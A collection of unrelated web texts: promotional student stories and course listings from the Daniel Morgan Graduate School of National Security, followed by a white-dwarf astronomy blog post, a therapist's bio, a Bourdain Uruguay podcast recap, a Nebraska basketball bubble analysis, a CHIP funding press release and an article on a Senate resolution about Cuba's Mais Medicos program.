GILBERT’S STORY
He says that his experience at the school has gone well above his already high expectations, going so far as to add that it has completely changed his perspective in multiple areas that he had previously viewed through a more narrow contextual lens. He is currently enrolled in the National Security M.A. program, with a specialization in International Relations.
“This gives me a special perspective and understanding of security across the globe. I increasingly understand the importance of studying security issues with a global backdrop since the impact of the National Security is not isolated. It is intertwined because of the interconnectedness of the modern world.”
To achieve his specific career and learning objectives and work within the confines of his prominent career,, Gilbert is obliged and has been approved to take an accelerated track that would enable him to complete this in only 15 months.
“The deans and professors at Daniel Morgan have been incredibly supportive in working with me to make the adjustments that I need to achieve my career objectives while meeting all the necessary academic milestones. They don’t put up roadblocks. They look for the solutions to the roadblocks.”
Gilbert is also impressed with DMGS’ personalized approach at the instructional level. He notes that the small classes result in everyone having a chance to express themselves and to better engage with the material being covered. He also explains how DMGS’ professors have a fascinating way of leading and guiding the class through their subjects, while deftly merging students’ international perspectives into the discussion.
“At this school, different skills and cultures come together in a very special way that enhances the learning experience for every one of us.”
SHANNON’S STORY
Upon her return to the United States, Shannon completed her undergraduate degree in her areas of true passion and was later accepted to continue her graduate studies at University of Glasgow. However, after one semester there, Shannon came to the realization that the program was not a good fit for her due to its intensely theoretical approach. Having been at the forefront of action rather than deliberation, Shannon found a theoretical program to be too confining for her needs and aspirations. Luckily, one of her professors at the university was Peter Jackson, a renowned editor of multiple major intelligence publications. Immediately understanding the frustrations of a student who had already experienced so much and wanted to do much more, hee advised her,
“If you are looking for something practical, there is a new, specialized school in Washington D.C. and everyone there has a fundamentally practical approach to graduate studies. I think that it would be a perfect fit and would get you where you want to go.”
Having taken his sage advice, Shannon is now at DMGS in her second semester and says that she is loving the experience. She goes on to say that Daniel Morgan has certainly lived up to the practical teaching and experience that she was looking for.
To illustrate her point, Shannon talks about one of the first professors she had at DMGS, a former diplomat who worked on the 911 commission and was, therefore, able to give her and her fellow students an inside perspective on actual events that others merely read as history.
Describing one of the biggest differences she is experiencing at Daniel Morgan compared to what she had encountered in higher education thus far, Shannon points to the exceptionally small class sizes:
“I don’t think other graduate students experience the personalized attention we get at DMGS. Each student gets immediate direction and mentorship; at most graduate schools a student would wait 3 weeks to get a paper back and then would have to make an office appointment 2 weeks after that for in-person guidance . Not here.”
Shannon also enthuses over the extraordinary opportunities that she has been given at DMGS. Thanks to a trip sponsored by the school, where she went on a week-long security summit just outside Prague, she was introduced to the UN NATO program (Youth Atlantic Treaty Association) and is now a UN NATO Ambassador. This means that, once per month, Shannon attends international conferences around the world. Shannon is, not only delighted to be a part of this, but is also very grateful for the way her professors at DMGS are so accommodating and encouraging to her in these endeavors.
Another significant advantage of being a DMGS student is the flexibility of having classes scheduled in the evening. Shannon is particularly appreciative of this since it has allowed her to obtain the best internships as well as to get the best out of her internships:
“I am able to work and come to class in the evenings. Other interns consistently have to leave and come back to work to attend classes during the day. As a result of DMGS’ class schedule I get better training than the other interns and it makes it easier for me to apply for jobs without class times getting in the way.”
Shannon believes that these factors all play into the reason DMGS graduates get such wonderful career positions upon graduation.
“I couldn’t believe some of the places that DMGS students have gone. A number of my fellow students have gotten jobs with the top contractors in National Security and one even just got a job at the White House.”
Shannon points out that this is a testament to how good the education and opportunities are at Daniel Morgan. She points out that top firms want DMGS graduates because they are extremely well-prepared, noting that high profile firms are keen to hire DMGS graduates even before the school has obtained the full accreditation status which is expected next year.
Shannon ends her story with a summary of her enthusiasm about the Daniel Morgan School:
“DMGS has been a perfect fit for me. I can’t even describe how wonderful this place is. Everyone is so kind and so intelligent and so well-connected. There is not a better school especially for anyone who has an interest in National Security. As the school is young, it is like a best kept secret …but it probably won’t be a secret for long.”
TOMASZ’S STORY
Tomasz is now at The Daniel Morgan Graduate School of National Security where he hopes to get an American perspective on issues related to Russian and global security. As he is obviously already extremely well-versed in this area, Tomasz sought out a program with the utmost authority and credibility to augment his own well-established base in the field. Tomasz found that level of authority when he came across current Daniel Morgan – and former Harvard professor, Yuval Weber’s biography. Seeing Dr. Weber’s well-documented expertise, Tomasz said that he “realized that DMGS was the right place to be.”
Now that he attends Daniel Morgan, he says that he is even more certain of the fact that DMGS was the place where true expertise in the field resided. In addition to the formidable intellect of Dr. Weber, Tomasz has also been struck by the depth of national and international expertise that resides within the DMGS faculty as a whole. In his own area of expertise, he has further been engaged by the extensive knowledge and insights of incoming professor, Dr. Edward Lemon, formerly a professor at Columbia University and now a DMGS-Kennan Institute Fellow. Dr. Lemon is a global authority on Eurasia. Talking enthusiastically about his experience at DMGS, Tomasz notes:
“It gives me a different angle and a truly global perspective in my chosen field which is particularly fascinating. These extremely erudite professors and stimulating courses have really shed light in several areas and have helped to unfasten the complex international geopolitical knot.”
Another reason Tomasz was drawn to The Daniel Morgan Graduate School was the possibility to be in the center of Washington D.C. amidst the hub of prestigious think tanks and media outlets with whom he had hoped to make connections. Tomasz says that his actual experience has greatly exceeded his expectations, as DMGS has given him significant access and entrees to several key organizations through its prestigious partners and events.
“It’s so easy to have extraordinary networking opportunities here at DMGS. Many doors have been opened for me and I have already been connected to many people and organizations that I would not have even dared to imagine.”
MARGALITA’S STORY
“I quit my job and embarked upon my second Master’s degree at DMGS because I realized that program would benefit me a great deal. I would not have left my job if I hadn’t anticipated this and I wasn’t disappointed. It was one of the best decisions that I have ever made as it has now led me to even higher paths.”
Nor was leaving her job an easy decision. Before DMGS, Margalita had been working for the UN and EU. She grew up in Tbilisi during the civil war and learned to count from the traces of the bullet holes against a building wall. Coming face to face with war at such a young age affected her career choices in later life and motivated her into positions where she would help people affected by conflict. Specifically, she worked on projects that supported the Prime Minister’s office in her native country of Georgia. She worked in a new agency commission on a National Action Plan implementing the UN Security Council’s Resolution on Women, Peace and Security. Her assignment was to identify the needs of conflict-affected women and girls. Together with the UN Women’s Mission as well as several government officials and advisors on human rights, Margalita travelled to villages along the Administrative Boundary Lines. Her mission was to identify the needs of these women and girls and to translate their aggregate problems into policy to support Georgia’s Three – year UN Action Plan. Margalita then went on to assist in building the necessary capacity to support the implementation of these policies and solutions under the European Union Project.
Margalita says that what drew her to DMGS and what ultimately drove her to take the significant step of leaving her UN position was the quality of the faculty at the school.
“It’s not the name or the history of a school that matters, it’s the professors.”
She is now very glad that she took the steps that she took in coming to DMGS. One of the professors she enthuses over is David Kanin whom she describes as “one of the most educated professors in the universe” and whose classes she describes “are like paradise.” In fact, Margalita is extremely enthusiastic about all of her professors whom she collectively describes as not just as compelling academicians but as extraordinary individuals.
“Even the five-minute interactions during the class breaks is something that we all look forward to.”
The extent of her satisfaction with the teaching at DMGS has been so great that she insists that the quality benchmark for lectures and discussions is now much higher than previously experienced and that she and her fellow students have consequently become “professor and lecture snobs.”
“We now all see how much others miss out on in traditional classes. We have never experienced and probably will never experience this type and level of teaching again.”
Another important facet of DMGS is the free-thinking aspect that underpins its pedagogic approach as the professors encourage their students to question everything rather than blindly following one school of thought. This is an approach which Margalita describes as “unique in today’s world that is oversaturated by opinion.”
“The minute you create an environment when you shut each other down, the learning ends. DMGS clearly understands this and opens up the learning environment to embrace all ideas.”
This openness to multiple viewpoints also extends to multiple cultures. By opening up its programs to those from other countries who seek to make the world a better and safer place, DMGS creates a dynamic and exciting learning environment. Margalita is also very enthusiastic about this and about the impact it has on the school’s environment.
“It’s a real privilege to be in the class with people from so many different backgrounds. It adds to our discussions in an amazing way.”
Finally, Margalita is also extremely enthusiastic about DMGS’ location and networking opportunities.“Being in D.C., magic happens outside the classroom. We meet the people that we only read about previously. We effectively meet history here.”
KENNETH’S STORY
His artistic talent earned him a place at the Art Institute of Boston, majoring in illustration. However, Kenneth left after a year because he was disappointed with the course content and did not want to waste his time on a course that did not fulfill him or develop his talents and aspirations. After some self-reflection, deliberation and research, he eventually decided to go to CUNY to study business and entrepreneurship to learn how to turn his artistic skills into “a business not a just passion.”
Upon graduation from the CUNY program, he took a break for a year to evaluate his next step. He experimented and explored different areas, starting a number of innovative art ventures and productions. He also took hospitality jobs to help finance his ventures. Yet Kenneth still felt as though he were missing something and, while he was contemplating joining the Peace Corps, his mentor advised him to look at DMGS.
He is well aware that many may not immediately make the connection between the study of Intelligence in conjunction with Business Entrepreneurship or Art.
Consequently, Kenneth goes on to explain that there are many areas in the private sector that require intelligence skills, describing it as an underserved field that is wide open for graduates. As time has progressed, Kenneth’s eyes have increasingly been opened to the niche positioning that a Master’s in Intelligence could bring to him to make him highly marketable in his fields of interest.
“I realized that being adept at intelligence-gathering in Business Arts and Media would be a specialized niche. I wouldn’t have to start my own business but instead would instantly have differentiated value upon graduation.”
To explain this further, Kenneth describes how intelligence is a key factor in making effective market and business decisions since being competitive requires knowing what competitors are doing in the marketplace. Even coming up with the title to a song can be amplified by intelligence gathering techniques as that information strengthens all strategic decision-making.
‘The Fundamentals of Intelligence course really taught me how to gather human intelligence – not just as it applies to spies – but to effectively make “informed decisions” using competitive intelligence. I learned how to craft a market analysis through public information. Knowing where to look and how to search things out it essential in all areas of business.”
Kenneth then turns to the subject of his professors. Like all the other students at DMGS, Kenneth cannot help but comment on how exceptional members of DMGS’ faculty are. In his opinion,, compared to other professors who “speak much but say little,”DMGS’ professors really deliver what he calls “the bottom line of knowledge in their subjects,” adding that there is “no fluff or wordiness” as they simply and clearly present relevant information in a succinct and pertinent form.
“They have years of experience and can therefore distill down what really matters in a real work setting. They then communicate the essence of each topic in a way that sticks with the student. Educators like this are few and far between. It is amazing to be in such small classes with such great professors.”
At DMGS, one can’t help but feel the warmth and camaraderie amongst the students. This is something that Kenneth clearly feels very deeply himself.
“I also admire my fellow students who have all done such amazing things before coming here. They inspire me to up my game and it humbles me to break bread and to study alongside people who have experienced even greater challenges than I and who ensure that I always keep an open mind.”
Pressed for an example of this, Kenneth talks about a couple of his fellow students: one who is a Kurd from Iran and one from Georgia who has lived in the shadow of the Soviet Union.
Before ending the discussion, Kenneth says that he must also stress two other things: DMGS’ speaker series and the school’s founder, Abby Moffat. The events, he says, have been hugely important to the learning environment because they reinforce what students are taught in the classroom and they also provide great networking opportunities, as students have the chance to engage with a number of prominent people in their fields of interest.
In describing Abby Moffat, he recounts how much she adds to the positive culture of DMGS. Kenneth also mentions that Abby has been particularly inspiring and encouraging to him on a personal level and that has made a big difference in his life.
“Abby Moffat brings a nurturing and compassionate entrepreneur spirit to the school. Her strength, kindness and insights drive the organization, just as my grandmothers’ strengths and courage drove the successes within my own family.”
RST 733, COMPARATIVE POLITICS
Comparative politics is the study of political systems around the globe. In this course, we will examine how political institutions, actors, and processes arise, operate and change around the world and how they affect society, culture, and the economy. The course combines theory with in-depth examinations of case studies from particular regions of the world. We will seek to explain why the Arab Spring broke out and why it failed to produce democratic transitions in many Middle Eastern states. We will examine what has caused civil wars to break out in certain parts of Africa but not in others. We will explore why democracy took root in Eastern Europe but not in most states of the former Soviet Union. And we will look at how China’s approach to economic development differs from that of Western powers.
MDV 650, FOUNDATIONS OF MANAGING DISRUPTION AND VIOLENCE
The Managing Disruption and Violence (MDV) Program provides theoretical and practical training to help students gain a better understanding of the persuasive communication principles, concepts, and processes organizations need to address the potential or active threat of disruptive or violent group behavior. MDV 650 integrates a broad overview of the material included in MDV 700 Integrated Risk Value Concepts and MDV 701 Causal Analytics for the non-MDV major. The Integrated Risk Value© (IRV) methodology provides the practical skills needed to develop and manage successful persuasive communications programs. MDV 650 is a prerequisite for non-MDV majors to take MDV 702 Strategy for Managing Disruption and Violence.
RST 725 – ISLAMIC POLITICS AND TERRORISM
Islamic revivalism is one of the most significant political, social and cultural phenomena of the 21st century, and will remain a potent force in the foreseeable future. Islamist movements are not monolithic, and tactics differ toward gaining power and implementing Islamic law. In recent years some Islamists have participated in politics and gained power through elections such as Hamas in Gaza, Ennahda in Tunisia, and the Muslim Brotherhood in Egypt. Others have taken up arms to resist violently against the state in Libya, Sinai, Syria, Iraq and Yemen. The Islamic Republic of Iran expands its empire through proxies and terrorist militias.
Al-Qaeda and Islamic State do not recognize the notion of the international Westphalian state system, and strive to erase recognized borders in the areas in which they operate to resurrect an Islamic empire called the Caliphate. While hatred of Israel, the West, secularism and liberal democracy persists, the immediate victims of militant Islamist violence are non-conforming Muslims and ethnic-religious minorities.
The course will analyze the ideology and goals of Sunni and Shia Islamist movements. It will assess what motivates these movements and why they are successful, and analyze their strengths and weaknesses. The course will explore their attitudes of the crisis of Islam in the contemporary era; the desired form of Islamic governance; the meaning of jihad in the contemporary era; and the compatibility between Islam and democracy. In particular, the course will examine Hamas, Hezbollah, the Muslim Brotherhood, the Iranian revolutionary regime, the Taliban, al-Qaeda, and Islamic State.
RST 727, RUSSIAN POLITICS AND STATECRAFT
This survey course on Russian politics and statecraft addresses enduring questions on: patterns of cooperation and confrontation with other great powers, a centrally dominated economy, and a political culture that exploits weak formal political institutions to sustain a very small leadership ground. In addressing these issues, we ask: What are the wars that have defined Russia’s borders? When and why do Russian leaders challenge other states? What does power in Russia look like? Who are the rulers and their supporters? How do they obtain, practice, and lose power?
In reviewing the origins and practices of Russian statecraft, we will assess when Russia as a great power has been (dis-) satisfied with the international distribution of economic and political benefits, and when it has sought to revise or maintain the international order. We will use this knowledge to address current issues in Russia’s relations with the Euro-Atlantic alliance and other world powers, including contentious issues such as money laundering, sanctions regimes, “information wars,” and Russia’s declared and undeclared conflicts.
RST 732, EURASIAN SECURITY
This course examines the security dynamics of Eurasia through an analysis of the policies of its largest state, Russia. The course examines the drivers of Russia’s pivot to Asia, Russia’s policies towards its Near Abroad, Asia-Pacific, South Asia and the Middle East, and the limitations of Russian influence. Through the course, students will gain a better understanding of the complexities of Russia’s dealings in a range of Asian regions, critically evaluate Russia as a global power. Class discussions and many of the readings will be focused on understanding and analyzing Russia’s contemporary policies with the view to giving students the ability to forecast the likely contours of domestic and foreign policy in the coming years. By the end of the course, students will have gained a more nuanced understanding of Russia, allowing them to critically approach some of the simplistic interpretations of Russian behavior in the media.
NSC 710 – HOMELAND SECURITY
This course introduces students to current public management policies and issues relevant to the security of the United States. The coordination of federal, state and local government agencies and nonprofit organizations which respond to threats is vital to the security of people, property and our way of life.

NSC 611 – US-CHINA STRATEGIC RELATIONS
Understanding contemporary Chinese history, starting with the Qing Dynasty, with a focus on post 1979 normalization of Sino-U.S. relations, will permit the students to better understand China’s approach to relations with the U.S. Knowledge of China’s military and political organizations will permit the students to better understand these organs of power and how they attempt to manage the plethora of international and domestic issues confronting China. It will also permit the student to appreciate the complexity of crafting a national strategy for dealing with an expansionist China.
MDV 700 – INTEGRATED RISK VALUE COMMUNICATIONS CONCEPTS
The Managing Disruption and Violence (MDV) Program provides theoretical and practical training to help students gain a better understanding of the persuasive communication principles, concepts, and processes organizations need to address the potential or active threat of disruptive or violent group behavior. MDV 700 teaches the in-depth and practical application of the Integrated Risk Value © (IRV) methodology for MDV majors.
This course provides the concepts and processes for developing and evaluating predictably successful communication strategies. Its focus includes practical frameworks to evaluate communication efforts, the strategic cycle and planning of IRV Communications, as well as an emphasis on developing Measures of Effectiveness.

Entangled States
Pulsar-like White Dwarf
January 3, 2008
by Nicholas Knisely	
Science	
Here’s a bit of unexpected news posted on the Universe Today:
Observations of a white dwarf star (stellar remnant made up of degenerate matter and about the size of a terrestrial planet) indicate that it is showing the same form of highly bi-directional radiation that we commonly see in the much smaller and much denser pulsar variant of a neutron star:
“Some white dwarfs, including AE Aquarii, spin very rapidly and have magnetic fields millions of times stronger than Earth’s. These characteristics give them the energy to generate cosmic rays. But the Suzaku observatory also detected sharp pulses of hard X-rays. After analyzing the data, the astronomy team realized that the hard X-ray pulses match the white dwarf’s spin period of once every 33 seconds.
The hard X-ray pulsations are very similar to those of the pulsar in the center of the Crab Nebula. In both objects, the pulses appear like a lighthouse beam, and a rotating magnetic field is thought to be controlling the beam. Astronomers think that the extremely powerful magnetic fields are trapping charged particles and then flinging them outward at near-light speed. When the particles interact with the magnetic field, they radiate X-rays.
‘We’re seeing behavior like the pulsar in the Crab Nebula, but we’re seeing it in a white dwarf,’ says Koji Mukai of NASA Goddard Space Flight Center in Greenbelt, Md. The Crab Nebula is the shattered remnant of a massive star that ended its life in a supernova explosion. ‘This is the first time such pulsar-like behavior has ever been observed in a white dwarf.'”
I suppose it’s not completely surprising, but it is unexpected. And interesting because it gives another mechanism for the creation of cosmic rays. Which may in turn lower our estimates of the populations of other sources.

About Me
I was born and raised in Colorado. The mountains and the outdoors have always been a big part of my life which is one reason I decided to move to Oregon. My wife and I have one child and we enjoy sharing the outdoors together as well as all the other fun things that Portland has to offer. Besides hiking and camping, I have many hobbies and a variety of interests including art history, architecture, woodworking, hunting, fly-fishing, bicycling, canoeing, gardening and mushroom hunting. I decided to go to graduate school in Denver to study my two interests at that time - psychology and spirituality. I enjoy traveling and studying other cultures and especially art and architecture. Recently I have been exploring evolutionary psychology which has expanded my knowledge and understanding of human behavior. My experiences form the background I draw from when trying to help other people who come to me with emotional or personal difficulties. Being able to help people is extremely rewarding and humbling at the same time.
About my practice
As a mental health therapist, I practice cognitive therapy about 90% of the time because of its effectiveness and it is the basis for most forms of psychotherapy used today. Cognitive therapy helps a person change their perspective to help them cope better with their problems. A simple explanation of cognitive therapy is to acknowledge that your thoughts influence your emotions and behaviors. Therefore it is important to examine your thoughts and then come to a decision to change your perspective. This can be very helpful in treating trauma, depression, anxiety and addictions. I have also developed a program for helping parents deal with their children based on classes and trainings I have taken as well as personal experience. What I like best about working for Kaiser is the knowledge and experience I have to draw from my co-workers who include psychiatrists, nurses, social workers and other counselors. This multi-disciplinary approach is the most beneficial mental health treatment available today. Another benefit of being a part of Kaiser Permanente is the access to special mental health programs within Kaiser Permanente such as intensive group therapy, or inpatient care.
How I thrive
I thrive by exercising, staying active, eating healthy and socializing. I have a small child and a dog at home that keep me very busy and active (especially going for walks with the two of them!) I keep my mind active by learning, reading, conversing and creating. I love to travel and staying in touch with family and friends is important to me. Getting outdoors is a great way to relieve stress. Deep breathing and yoga also help me keep balance in my life.

Uruguay
Know
Tony traveled to Uruguay this week with chef and restauranteur Ignacio “Nacho” Mattos. They ate some homemade tuco with Mattos’ abuela, devoured a chivito sandwich, and took a smoke break with Uruguay’s favorite punk band Hablan Por La Espalda. Stand-up comedian Jennifer Neal and Roads & Kingdoms co-founder Nathan Thornburgh rehash the episode.
Jennifer Neal: What initially struck me about this episode is that when Bourdain goes to a new place, he goes in with this feeling of exploration, like, “This is what I’m searching for” or “These are the questions.” In Uruguay, he was just like, “I love this country, I love these people, I love this food.” It’s just him hanging with his friends, eating his food, smoking his weed, drinking his beer.
Nathan Thornburgh: Yeah, he’s been there before, and that’s probably why he went back. He just likes it. He keeps asking his buddy Ignacio [Mattos], “Why don’t you move back here?”
So let’s get to the sandwich. But first, there was the candombé—the drum line—sequence right after the introduction.
Neal: You have this very captivating sequence with drums and people. When people talk about Uruguay as a melting pot, I assumed it was Italian and Spanish and Portuguese—Europeans. But when I saw the drum line and all of these people of different shades, it was interesting to me because I thought of Uruguay as being an especially white South American country. In fact, something like 10 percent of Uruguayans identify as mixed race. I wanted to see more of that.
Thornburgh: So on to the sandwich.
Neal: I’ve been waiting for this moment for a very long time, and that particular sequence of food porn did not disappoint. I give it a solid four and a half out of five stars. The ham, the cheese—what was I missing there?
Thornburgh: Steak, ham, and cheese up there. That’s the chivito. The national sandwich. We have this incredible recipe online. You can make up your own, though, if you’re just sitting around, thinking you’ve had too many greens. It’s just meat upon meat upon meat. That is the South American way, and I’m here for it.
Neal: Tony talks with Carina Novarese, a local journalist about the politics and history of Uruguay’s right-wing dictatorship [from 1973 to 1985], which was, in part, installed by the American government and the CIA.
What do you feel—as an American—when you hear stories like this? I cannot help but think about Facebook and the Cambridge Analytica scandal and how we’re outraged that social media in Russia pushing fascist causes in America—all of Latin America must be screaming with schadenfreude.
Thornburgh: Yet again, Tony is doing an episode from a place that has been grievously treated by the United States, and he comes not just as a world traveler but as an American. It’s always interesting to see him navigate that. As Americans, we all have our different crosses to bear when we travel overseas.
Jennifer, you live in Berlin, where progressives are not afraid to speak their mind about America’s past misdeeds. Do you get a lot of that heat? How do you deal with it?
Neal: I joke about this a bit in my stand-up. Western and Northern Europeans, Germans in particular, love to come up to me and hold me accountable for the actions of America. I’m going to tell you the same thing I tell them: Unless Donald Trump comes deep fried, smothered in hot sauce, and served in a bucket that says “Black lives matter,” I don’t want shit to do with him. When I go to brown and black countries, though, they’ll rant and rave about the American government but nudge me and say, “Well, you get it. You’re black.”
Provoleta.
Thornburgh: Then you’ve got Tony, a white man. But he was presumably not responsible for Operation Condor.
Neal: Not as far as we know.
Thornburgh: It strikes me that I’m often in the position he’s in: He’s not responsible, [but] we have to take some kind of collective responsibility for this. That conversation with Carina was interesting, just to watch him absorb what she was saying.
Neal: A lot of Americans still probably have no idea about the United States government’s role in Latin America in the not-so-distant past. I like that he revisits that without shame, necessarily. It’s educating people about something that people need to be reminded of repeatedly.
Then he starts hanging out with these really interesting hardcore cats called Hablan por la Espalda.
Thornburgh: Correct. They got super high, went and hit some pizza joint—
Neal: Wait—what was the chickpea flatbread on top of pizza? When you’re super high, you’re obviously thinking munchies, but you’re also thinking about your gluten-free diet, and so you just combine the two? That would make sense in my mind.
Thornburgh: It’s a simple joy to watch stoned people eating stoned-people food. Maybe that could be Tony’s next show concept.
Neal: Apparently those guys were vegan at some point in their lives.
Thornburgh: I think one of them still was. Tony is obviously a noted a vegan agonist. He seems to enjoy turning the screw a little bit, but this was one of the best vegan-Tony encounters I’ve seen—or at least the friendliest.
Neal: So Bourdain keeps saying, “This is the country where you go to eat meat.” And I was a little skeptical until he took us to Carniceria Carnelandia.
Thornburgh: I’ve got to say, one of the things I find attractive about Uruguayan food culture is that it’s an unapologetic meat experience. How does this work for their diets? They seem to be doing all right. Maybe they can offset all that meat with a lot of red wine.
Neal: That’s a balanced diet right there. No vegetables, no water. Red wine with meat. They’re good.
They went to Nacho’s family home in Santa Lucía, and of course, Bourdain starts asking Nacho again, “Why would you leave this?” I felt a little bad for Nacho because he’s sitting there while Bourdain talks about him to his family, and his family is psychoanalyzing him. I go, “That’s why he left.”
Thornburgh: The thing about Nacho, which you don’t really get from this episode, is that the guy is a stirringly good cook. [His restaurant] Estela is the restaurant that the cooks go to eat in New York City. So Nacho’s quiet, he’s chill, he’s from this pretty little place. He’s catching a lot of shit from Tony for being a New Yorker. But this guy is a god in the kitchen.
Neal: I really liked that duality about his character. He seemed like a super-chill, relaxed dude. But once I did a little bit of research, I was like, “Who is this guy?” And he’s incredibly impressive, and I really need to head to his restaurant next time I’m in New York.
Thornburgh: Or he should just do like everybody else and open a restaurant in Berlin. After visiting Nacho’s family, they go to Cantina del Vigía, and they have all of this incredible food. As far as food porn metaphors go, that was definitely the money shot of the episode for me.
Neal: That provoleta. Just straight, hard, cheese porn bubbling up.
Thornburgh: Fair enough. I mean, you know, it’s hot, gooey cheese. What the heck else you want out of life? Are we going to see anything to top it this season?
Neal: Young man, we got a lot of food porn to get through. Anyway, there’s this really interesting scene where they’re just smoking weed on the beach, just because they can, and they’re waiting for Diego [Robino] to come pick them up. And you know how I was saying earlier in the episode that I don’t really see a lot of diversity here? When they’re driving with Diego and his car breaks down, I realized Diego was the black person in this episode—like, he could hold a temporary pass, you know? They go from the car breaking down to a drive-through, and I was like, “Yo, this is the blackest thing that’s ever happened on Parts Unknown.” I mean, at least on this episode.
Ignacio “Nacho” Mattos cooking on the beach in Jose Ignacio, Uruguay.
Thornburgh: Ha. What’s next?
Neal: Then they have this really gorgeous cookout near the sea. It’s what you would want to do with your friends on a Sunday afternoon when the weather’s nice.
Thornburgh: It looked amazing.
Neal: How did you feel at the end of this episode? Did you feel like you wanted to go to Uruguay?
Thornburgh: It looks like a lovely place, even if I’m a little bored by it. But there’s room for all of those things in life. A place doesn’t have to blow your mind every minute or challenge everything you’ve ever thought about everything. If I was feeling stressed out, if life was getting rough, I would go there to cool off. What about you?
Neal: I would definitely go—if not just for the food, for the barbecue and the gooey cheese. That needs to happen before I die. Maybe that will be the reason I die. Who knows? There are worse ways to go.
Thornburgh: Yes, like lack of cheese. That would suck even more—“Died because she couldn’t get enough cheese …”

Twenty-six days before Selection Sunday, Nebraska is on pace to be college basketball’s toughest bubble team to judge.
The Huskers possess a resume atypical for a power-conference program with NCAA tournament aspirations.
The case for Nebraska is that its 20-8 overall and alone in fourth place in the Big Ten with an 11-4 league record. A Big Ten team with 12 league wins has not missed the NCAA tournament since the league schedule expanded to 18 games in 2008. In fact, only 2015-16 Ohio State has not landed an NCAA bid during that span with an 11-7 Big Ten record.
The case against Nebraska is that its 20 wins are mostly empty calories. The Huskers don’t have a single Quadrant 1 victory this season and their home win against Maryland on Tuesday night was only their fourth Quadrant 2 victory of the year. Aside from drubbing Michigan by 20 at home last month, Nebraska hasn’t beaten a single other team in NCAA tournament contention.
What that means is that Nebraska is nowhere near safe despite its six-game win streak in Big Ten play. The Huskers need to keep winning to have a realistic shot of reaching the NCAA tournament for the second time under coach Tim Miles.
The good news is that Nebraska’s final three Big Ten games are all very winnable. The bad news is that beating lowly Illinois on the road and then handling Indiana and Penn State at home won’t address any of the flaws on the Huskers’ resume. They’ll need to avoid damaging losses in those games and then make a run in the Big Ten tournament in order to truly feel secure.
How deep a run in the Big Ten tournament Nebraska needs will depend on how the committee evaluates the Huskers’ resume to date.
They haven’t won a game against any of the three Big Ten teams ahead of them in the standings, but they faced Ohio State, Purdue and Michigan State once apiece and all on the road. They lost both their marquee non-conference games against Kansas and Creighton, but they had two shots to beat the Jayhawks in the final 10 seconds and they pushed the Bluejays into the final minute in Omaha. They don’t get much credit anymore for defeating Minnesota on Dec. 5, but at that time the Golden Gophers still had Reggie Lynch and Amir Coffey and were ranked in the AP top 20.
That Nebraska is even in contention for an NCAA tournament bid is a pleasant surprise. Miles’ job appeared to be in jeopardy entering the season with the Huskers coming off three straight losing seasons and this year’s team projected 13th in the Big Ten preseason poll.
Having Miami transfer James Palmer and Georgetown transfer Isaac Copeland available this year has been a huge boost. Those two lead Nebraska in scoring and help anchor a defense that has been stout in every area aside from keeping opponents from racking up second-chance points.
There is a precedent for a major-conference team with a 14-4 league record missing the NCAA tournament even if its exceedingly rare. It happened to outright Pac-12 champion Washington in 2012 when the Huskies accomplished next to nothing in non-league play and then crashed out of the conference tournament in their opening game.
The lesson Nebraska can learn from that Washington team is that it can’t let up and that every win counts
Anything short of a 14-4 conference record and a deep Big Ten tournament run will leave the Huskers with an anxiety-ridden wait until Selection Sunday.

FOR IMMEDIATE RELEASE

Children’s Groups Urge Quick Bipartisan 5-Year CHIP Extension	
Bruce Lesley	
Health	
First Focus and leading organizations dedicated to the well-being of children are calling on Congress to immediately enact a five-year extension of CHIP funding.
FULL STATEMENT:
Statement of the National Children’s Health Community Urging Quick Bipartisan Action on a Strong, Five-Year Extension of Funding for the Children’s Health Insurance Program
August 3, 2017
As our nation marks the 20th anniversary of the Children’s Health Insurance Program (CHIP) this week, our organizations call on Congress to take immediate action to enact a five-year extension of CHIP funding. Since its inception in 1997, CHIP, together with Medicaid, has helped to reduce the numbers of uninsured children by a remarkable 68 percent. With CHIP funding set to expire on September 30, 2017, now is the time for Congress to stabilize the CHIP funding stream and protect the gains in children’s health coverage that have resulted in more than 95 percent of all children in America being enrolled in some form of insurance coverage.
CHIP has a proven track record of providing high-quality, cost-effective coverage for low-income children and pregnant women in working families. CHIP was a smart, bipartisan solution to a real problem facing American children and families when it was adopted in 1997 and its importance and impact in securing a healthy future for children in low-income families has only increased. Senators, representatives, and governors all recognize the importance of CHIP in providing affordable, pediatric-specific coverage to almost 9 million children who cannot afford private coverage or lack access to employer-based coverage. CHIP also delivers quality, affordable care to pregnant women in 19 states, allowing them to obtain the care they need to have healthy pregnancies and give birth to healthy infants.
With federal CHIP funding set to end on September 30, 2017, states are facing critical decisions about the future of their CHIP programs. Many states are just weeks away from setting in motion processes to establish waiting lists and send out disenrollment notices to families. Once undertaken, these actions will have an immediate effect, creating chaos in program administration and confusion for families.
Extending CHIP is particularly important in light of the ongoing debate on and uncertainty regarding the future of the Affordable Care Act (ACA), Medicaid, and the stability of the individual insurance markets. With state budgets already set for the coming year, states are counting on CHIP to continue in its current form. Changes to CHIP’s structure – including changes to the Maintenance of Effort or the enhanced CHIP matching rate – would cause significant disruption in children’s coverage and leave states with critical shortfalls in their budgets. Given CHIP’s track record of success, changes to CHIP that would cause harm to children must not be made.
Today, we stand united in urging Congress to honor CHIP’s 20 years of success by securing this critical source of coverage for children and pregnant women into the future. As Congress continues to work on larger health system reforms, a primary goal should be to improve health coverage for children, but at a minimum, no child should be left worse off. We urge our nation’s leaders to work together to enact a five-year extension of CHIP funding as an important opportunity for meaningful, bipartisan action.

Bipartisan Resolution Condemns Cuba on Mais Medicos

A resolution condemning Cuba’s communist regime has just been introduced by Senator Marco Rubio, a member of the U.S. Senate Foreign Relations Committee, and Democrat Senator Bob Menendez.
The resolution accuses Cuba’s regime of heading a “program that sends tens of thousands of Cuban medical professionals to foreign countries to work under conditions that qualify as human trafficking.” It adds that “thousands of Cuban medical professionals” that are forced “to participate in a state-sponsored program to work in Brazil, where they are subject to wage garnishing, restrictions on their movement, and constant surveillance by the Cuban regime – conduct that constitutes state-sponsored human trafficking.”
This comes a month after former Congressman Carlos Curbelo and former Congresswoman Ileana Ros-Lehtinen criticized the communist regime for its actions in the “Mais Medicos” program in Brazil. In addition, Cuban health care workers have filed a lawsuit, claiming “that the Pan American Health Organization facilitated the human trafficking of thousands of Cuban medical professionals.”
Speaking on the bipartisan resolution, Senator Marco Rubio asserted that “it is outrageous, though not surprising, that the Cuban dictatorship continues to manipulate and traffic physicians in order to enrich itself. This form of forced labor should not go unnoticed by the international community. We must stand against the regime’s modern-day slavery scheme and support the doctors seeking justice after serving in these so-called international medical missions.”
